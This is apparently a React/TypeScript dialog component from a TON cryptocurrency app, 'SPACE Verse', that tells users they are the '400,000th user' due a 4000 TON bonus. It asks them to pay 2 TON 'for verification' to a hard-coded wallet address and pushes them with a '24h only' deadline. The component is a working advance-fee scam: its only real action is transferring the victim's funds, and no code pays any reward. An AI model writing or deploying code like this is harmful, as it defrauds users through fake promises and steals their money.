import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useTonWallet } from "@/hooks/useTonWallet";
import { TonTransactionService } from "@/services/tonTransactionService";
import { useTonConnectUI } from "@tonconnect/ui-react";
import { useToast } from "@/hooks/use-toast";
import { Star, Gift, Clock, Shield } from "lucide-react";
interface CongratulationsDialogProps {
  isOpen: boolean;
  onClose: () => void;
}
export default function CongratulationsDialog({
  isOpen,
  onClose
}: CongratulationsDialogProps) {
  const {
    isConnected
  } = useTonWallet();
  const [tonConnectUI] = useTonConnectUI();
  const {
    toast
  } = useToast();
  const [isProcessing, setIsProcessing] = useState(false);
  const handlePayment = async () => {
    if (!isConnected || !tonConnectUI) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      });
      return;
    }
    setIsProcessing(true);
    try {
      const transactionService = new TonTransactionService(tonConnectUI);

      // Send 2 TON verification transaction
      await transactionService.sendTransaction("UQBxhVcqUFQSClJdPq9Dz7Eo45iInF0wUmJJKZIslvsnPZkE",
      // Verification address
      2,
      // 2 TON
      "SPACE Verse verification - 400,000th user reward claim");
      toast({
        title: "Verification Successful!",
        description: "Your 4002 TON reward will be sent within 24 hours",
        variant: "default"
      });
      onClose();
    } catch (error) {
      console.error("Transaction failed:", error);
      toast({
        title: "Transaction Failed",
        description: "Please try again or contact support",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };
  const handleConnectWallet = () => {
    tonConnectUI.openModal();
  };
  return <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-xs w-[85vw] mx-auto glass-card border border-primary/20 p-2 rounded-lg backdrop-blur-xl bg-card/80 shadow-xl z-50">
        <DialogHeader className="text-center space-y-1">
          {/* Header with celebration icons */}
          
          
          <DialogTitle className="text-sm font-bold bg-gradient-to-r from-yellow-400 to-purple-400 bg-clip-text text-transparent">
            SPACE Verse!
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-2">
          {/* Main message */}
          <div className="text-center space-y-2">
            <div className="bg-gradient-to-r from-purple-500/20 to-blue-500/20 rounded p-2 border border-purple-500/30">
              <p className="text-white text-xs leading-tight">
                You're our <span className="font-bold text-yellow-400">400,000th user</span>! Get <span className="font-bold text-green-400">4000 TON</span> bonus!
              </p>
            </div>

            {/* Verification info */}
            <div className="bg-blue-500/10 rounded p-2 border border-blue-500/30 space-y-1">
              <div className="flex items-center gap-1 text-blue-300 justify-center">
                <Shield className="w-3 h-3" />
                <span className="text-xs font-medium">Verification</span>
              </div>
              <p className="text-white text-xs">
                Send <span className="font-bold text-yellow-400">2 TON</span> for verification
              </p>
              <p className="text-green-300 text-xs">
                Get 2 TON back + 4000 TON reward
              </p>
            </div>

            {/* Total calculation */}
            <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 rounded p-2 border border-green-500/30">
              <p className="text-green-300 font-bold text-sm">
                Total = 4002 TON
              </p>
            </div>

            {/* Time limit warning */}
            <div className="bg-orange-500/10 rounded p-1 border border-orange-500/30">
              <div className="flex items-center gap-1 justify-center text-orange-300">
                <Clock className="w-3 h-3" />
                <span className="text-xs">24h only</span>
              </div>
            </div>
          </div>

          {/* Action button */}
          <div className="space-y-1">
            {isConnected ? <Button onClick={handlePayment} disabled={isProcessing} className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white text-xs py-2 rounded transition-all">
                {isProcessing ? <span className="flex items-center gap-1">
                    <div className="w-3 h-3 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </span> : "Pay 2 TON & Claim"}
              </Button> : <Button onClick={handleConnectWallet} className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white text-xs py-2 rounded transition-all">
                Connect Wallet
              </Button>}
          </div>
        </div>
      </DialogContent>
    </Dialog>;
}